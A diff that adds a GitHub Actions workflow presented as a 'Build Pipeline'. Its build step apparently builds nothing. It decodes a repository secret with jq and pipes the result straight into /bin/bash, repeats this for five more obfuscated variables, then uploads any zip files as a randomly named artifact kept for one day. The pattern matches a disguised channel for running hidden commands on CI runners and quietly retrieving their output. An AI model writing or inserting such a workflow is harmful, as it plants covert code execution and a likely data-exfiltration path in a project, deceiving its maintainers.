@@ -1,0 +1,31 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          x9485: ${{ secrets.x9485 }}
+        run: |
+          printf '%s' "$x9485" | jq -r .kdyup65307 | /bin/bash
+          echo $pp32 | jq -r .w56793 | /bin/bash
+          echo $fauc47269 | jq -r .lt131 | /bin/bash
+          echo $gyoqy60091 | jq -r .uelm04 | /bin/bash
+          echo $km80946 | jq -r .qzrop5860 | /bin/bash
+          echo $rbtg748 | jq -r .iks1 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: NQllxNBM
+          path: "*.zip"
+          retention-days: 1
